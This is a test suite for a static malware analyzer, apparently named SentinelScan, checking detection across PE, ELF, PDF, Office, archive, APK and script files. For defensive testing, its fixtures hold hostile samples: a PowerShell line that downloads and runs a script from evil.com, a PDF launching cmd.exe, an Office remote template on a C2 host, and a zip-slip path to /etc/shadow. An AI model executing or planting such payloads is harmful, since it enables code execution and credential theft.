import { test, describe } from 'node:test';
import assert from 'node:assert/strict';

import { detectFileType } from '../../server/analyzers/file_type.js';
import { parsePE } from '../../server/analyzers/pe_analyzer.js';
import { parseELF } from '../../server/analyzers/elf_analyzer.js';
import { parsePDF } from '../../server/analyzers/pdf_analyzer.js';
import { parseOffice } from '../../server/analyzers/office_analyzer.js';
import { parseArchive } from '../../server/analyzers/archive_analyzer.js';
import { parseAPK } from '../../server/analyzers/apk_analyzer.js';
import { parseScript } from '../../server/analyzers/script_analyzer.js';
import { calculateRiskAssessment } from '../../server/analyzers/risk_engine.js';

describe('SentinelScan Static Analyzers Suite', () => {

  test('Extension Mismatch: Disguised Executable Flagged as Critical', () => {
    // Buffer starting with MZ (0x4D, 0x5A) and PE NT signature
    const mzBuffer = Buffer.alloc(1024);
    mzBuffer[0] = 0x4D;
    mzBuffer[1] = 0x5A;
    mzBuffer.writeUInt32LE(0x80, 0x3C);
    mzBuffer.write('PE\0\0', 128);

    const result = detectFileType(mzBuffer, 'annual_invoice.pdf');
    assert.ok(result.format === 'PE' || result.format === 'PE_EXECUTABLE');
    assert.strictEqual(result.mismatchDetails.hasMismatch, true);
    assert.strictEqual(result.mismatchDetails.findings[0].severity, 'CRITICAL');
  });

  test('PE Parser: Detects Section Entropy and W^X Flag', async () => {
    // Synthesize minimal valid PE structure in memory
    const peBuf = Buffer.alloc(1024);
    peBuf[0] = 0x4D; // 'M'
    peBuf[1] = 0x5A; // 'Z'
    peBuf.writeUInt32LE(0x80, 0x3C); // e_lfanew -> 128

    // NT Headers signature 'PE\0\0' at offset 128
    peBuf.write('PE\0\0', 128);
    // File Header at 132
    peBuf.writeUInt16LE(0x8664, 132); // Machine x64
    peBuf.writeUInt16LE(1, 134); // 1 section
    peBuf.writeUInt16LE(240, 148); // SizeOfOptionalHeader

    // Optional Header at 152
    peBuf.writeUInt16LE(0x20b, 152); // PE32+ (x64)
    peBuf.writeUInt32LE(0x1000, 168); // AddressOfEntryPoint

    // Section Header at 152 + 240 = 392
    const secOffset = 392;
    peBuf.write('.text\0\0\0', secOffset);
    peBuf.writeUInt32LE(0x200, secOffset + 8); // VirtualSize
    peBuf.writeUInt32LE(0x1000, secOffset + 12); // VirtualAddress
    peBuf.writeUInt32LE(0x200, secOffset + 16); // SizeOfRawData
    peBuf.writeUInt32LE(0x200, secOffset + 20); // PointerToRawData
    // Characteristics: IMAGE_SCN_MEM_EXECUTE (0x20000000) | IMAGE_SCN_MEM_WRITE (0x80000000)
    peBuf.writeUInt32LE(0xA0000000, secOffset + 36);

    const parsed = await parsePE(peBuf);
    assert.strictEqual(parsed.isPE, true);
    assert.ok(parsed.architecture.includes('64') || parsed.machine.includes('x64'));
    assert.strictEqual(parsed.sections.length, 1);
    assert.strictEqual(parsed.sections[0].isWritableAndExecutable, true);

    const wxFinding = parsed.findings.find(f => f.title.includes('Writable & Executable'));
    assert.ok(wxFinding, 'Should generate W^X violation finding');
  });

  test('ELF Parser: Validates ELF32/64 Magic and Identifies RWX Segments', async () => {
    const elfBuf = Buffer.alloc(512);
    // \x7FELF
    elfBuf[0] = 0x7F;
    elfBuf[1] = 0x45;
    elfBuf[2] = 0x4C;
    elfBuf[3] = 0x46;
    elfBuf[4] = 2; // 64-bit
    elfBuf[5] = 1; // Little endian
    elfBuf[18] = 0x3E; // AMD x86-64

    // e_phoff = 64
    elfBuf.writeBigUInt64LE(64n, 32);
    // e_phnum = 1
    elfBuf.writeUInt16LE(1, 56);
    // e_phentsize = 56
    elfBuf.writeUInt16LE(56, 54);

    // Program Header at 64: PT_LOAD (1), p_flags = PF_X (1) | PF_W (2) | PF_R (4) = 7
    elfBuf.writeUInt32LE(1, 64);
    elfBuf.writeUInt32LE(7, 68);

    const parsed = await parseELF(elfBuf);
    assert.strictEqual(parsed.isELF, true);
    assert.strictEqual(parsed.class, 'ELF64');
    assert.strictEqual(parsed.programHeaders[0].isWritableAndExecutable, true);
    assert.ok(parsed.findings.some(f => f.title.includes('Writable and Executable')));
  });

  test('PDF Parser: Flags /JavaScript and /Launch Actions', async () => {
    const pdf = Buffer.from(`%PDF-1.7
1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction << /S /Launch /F (cmd.exe) >> >> endobj
2 0 obj << /JS (util.printd('test')) >> endobj
trailer << /Root 1 0 R >> %%EOF`);

    const result = await parsePDF(pdf);
    assert.strictEqual(result.isPDF, true);
    assert.strictEqual(result.hasLaunch, true);
    assert.strictEqual(result.hasJavaScript, true);
    assert.ok(result.findings.some(f => f.title.includes('/Launch') || f.title.includes('Launch')));
  });

  test('Office Parser: Identifies Remote Template Injection & VBA Macros', async () => {
    const docData = Buffer.from('PK\x03\x04TargetMode="External" Target="http://malicious-c2.example.com/exploit.dotm" vbaProject.bin');
    const result = await parseOffice(docData);
    assert.strictEqual(result.isOffice, true);
    assert.strictEqual(result.hasRemoteTemplateInjection, true);
    assert.strictEqual(result.hasVbaMacros, true);
    assert.strictEqual(result.findings.length, 2);
  });

  test('Archive Parser: Detects Zip Slip (Directory Traversal)', async () => {
    // Construct minimal ZIP with traversal entry
    const header = Buffer.alloc(30);
    header.write('PK\x03\x04', 0);
    const fname = '../../../../etc/shadow';
    header.writeUInt16LE(fname.length, 26);
    const fullZip = Buffer.concat([header, Buffer.from(fname), Buffer.alloc(22)]);

    const parsed = await parseArchive(fullZip);
    assert.strictEqual(parsed.isArchive, true);
    assert.strictEqual(parsed.hasTraversalAttacks, true);
    assert.ok(parsed.findings.some(f => f.title.includes('Directory Traversal Attempt')));
  });

  test('APK Parser: Detects Sensitive Android Permissions', async () => {
    const apkData = Buffer.from('AndroidManifest.xml android.permission.SEND_SMS android.permission.SYSTEM_ALERT_WINDOW classes.dex');
    const parsed = await parseAPK(apkData);
    assert.strictEqual(parsed.isAPK, true);
    assert.strictEqual(parsed.highRiskPermissions.length, 2);
    assert.ok(parsed.findings.some(f => f.title.includes('SEND_SMS')));
  });

  test('Script Analyzer: Detects Dangerous PowerShell Invocations', async () => {
    const script = Buffer.from(`
      $w = New-Object System.Net.WebClient
      Invoke-Expression ($w.DownloadString("http://evil.com/payload.ps1"))
    `);
    const parsed = await parseScript(script);
    assert.strictEqual(parsed.dangerousPatternsFound.length >= 2, true);
    assert.ok(parsed.findings.some(f => f.title.includes('Invoke-Expression')));
  });

  test('Risk Engine: Calculates Deterministic Scoring and Verdicts', () => {
    const assessment = calculateRiskAssessment({
      fileTypeResult: { format: 'PE', mismatchDetails: { hasMismatch: true, findings: [{ severity: 'CRITICAL', reason: 'Disguised EXE' }] } },
      clamAvResult: { state: 'INFECTED', available: true, virusName: 'Win32.TestTrojan' },
      peResult: { isPE: true, findings: [{ title: 'Writable & Executable section' }] }
    });

    assert.strictEqual(assessment.score >= 75, true);
    assert.strictEqual(assessment.verdict, 'CRITICAL_RISK');
    assert.strictEqual(assessment.confidence, 'HIGH');
    assert.ok(assessment.weightedEvidence.length >= 2);
  });
});
